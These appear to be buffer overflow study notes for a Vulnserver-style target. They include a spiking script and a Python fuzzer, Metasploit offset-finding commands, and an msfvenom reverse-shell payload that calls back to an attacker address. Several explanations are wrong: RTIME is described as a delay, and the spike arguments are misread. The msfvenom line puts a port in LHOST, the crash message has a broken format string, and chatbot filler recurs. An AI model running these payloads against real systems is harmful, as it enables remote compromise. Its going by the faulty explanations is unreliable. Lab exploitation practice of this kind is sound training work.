# 5_Fundamentals of Buffer Overflow

# Introduction

### Learning Objectives

- Setting up a test environment for learning buffer overflow
- Understanding spiking and fuzzing techniques
- Discovering the offset and writing to the EIP
- Discovering and resolving bad characters
- Creating a malicious payload using Shellcode
- Compromising a system

### `nc -nv <ip> 9999`

`nc` stands for Netcat, which is a versatile networking tool that can be used to establish connections between computers. The `-nv` options specifies that the connection should be made in verbose and numeric-only mode.

`<ip>` should be replaced with the IP address you want to connect to.

`9999` is the port number you want to connect to. Once the connection is established, you can use it to send and receive data between the two computers.

Overall, this command is useful for tasks such as remote access and data transfer.

Let me know if you need more information or clarification.

### `generic_send_tcp`

`generic_send_tcp` is a tool used for sending arbitrary data over a TCP connection. It can be used for tasks such as sending payloads to a remote target during a penetration test. The tool can be used in conjunction with other tools to create complex attack scenarios.

Let me know if you need more information or clarification.

### Point

```
1s_readline();
2s_string("RTIME ");
3s_string_variable("0");

```

The above code is an example of how to use the RTIME command in an exploit script. The `s_readline()` function reads a line of input from the target, while `s_string()` sends a string of characters to the target. The `s_string_variable()` function sends a variable value to the target.

The RTIME command is used to add a delay to the exploit. In this case, the delay is set to 0 seconds, which means that the exploit will execute immediately after the target receives it.

Then, save the above commands on rtime.spk file with text editor, and run the following command:

`generic_send_tcp 10.211.55.12 rtime.spk 9999 0 0`

The command `generic_send_tcp 10.211.55.12 rtime.spk 9999 0 0` sends the contents of the `rtime.spk` file to the IP address `10.211.55.12` on port `9999`. The `0 0` at the end of the command specifies that no delay should be added before or after sending the data.

This command is useful for testing exploits in a controlled environment. By sending exploits to a test system, security researchers can determine if the exploits are effective without risking damage to a production system.

# Determining the Offset

```python
#! /usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect (('10.211.55.12', 9999))

		payload = "TRUN /.:/" + buffer

		s.send ((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print ("Crashed happened at % bytes" % str(len(buffer)))
		sys.exit()

```

The above is a Python script that can be used to test for a buffer overflow vulnerability. The script works by sending a series of increasingly large payloads to the target system until the system crashes. When the system crashes, the script reports the length of the payload that caused the crash.

To use the script, replace `10.211.55.12` with the IP address of the target system and `9999` with the port number that the vulnerable service is running on. Run the script and wait for it to report a crash.

This script is useful for identifying the length of the buffer needed to overflow the target system's buffer and control the EIP. Once the length of the buffer is known, it can be used to craft a payload that will execute arbitrary code on the target system.

`**/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 6600**`

The above command generates a unique pattern of 6600 bytes. This pattern can be used to identify the offset of the EIP register in the target system's memory.

To use the pattern, send it to the target system and observe the value of the EIP register when the system crashes. The value of the EIP register can then be used to determine the offset of the pattern in the target system's memory.

This command is useful for testing for buffer overflow vulnerabilities and identifying the offset needed to control the EIP register.

`**/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6600 -q 386F4337**`

The command  can be used to determine the offset of the EIP register in the target system's memory. The `-l` option specifies the length of the pattern, and the `-q` option specifies the value to search for in the pattern. Replace `6600` with the length of the payload used to crash the target system, and replace `386F4337` with the value of the EIP register at the time of the crash. This command will output the offset of the value in the pattern.

# Find the Right Component

`msf-nasm_shell` is a tool used to convert assembly code into machine code that can be executed on a target system. It is included as part of the Metasploit Framework and can be used to create payloads for exploits.

To use the tool, run `msf-nasm_shell` from the command line. This will open the tool's prompt. Enter the assembly code that you want to convert into machine code at the prompt, and press Enter. The tool will output the corresponding machine code.

This tool is useful for creating payloads for exploits that can be used to take control of a target system.

# Creating Malicious Shellcode for Root Access

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=172.30.1.36 LHOST=4444 EXITFUNC=thread -f c -a x86 -b "\\x00"

```

The above command creates a payload for a Windows system that will establish a reverse TCP connection to the IP address `172.30.1.36` on port `4444`. The `EXITFUNC=thread` option specifies that the payload should exit cleanly. The `-f c` option specifies that the payload should be output in C format. The `-a x86` option specifies that the payload should be compiled for an x86 architecture. The `-b "\\x00"` option specifies that null bytes should be avoided in the payload.

This payload can be used to create a reverse shell on a target Windows system, providing the attacker with full access to the system.

Note that this command is for educational purposes only and should not be used for illegal activities.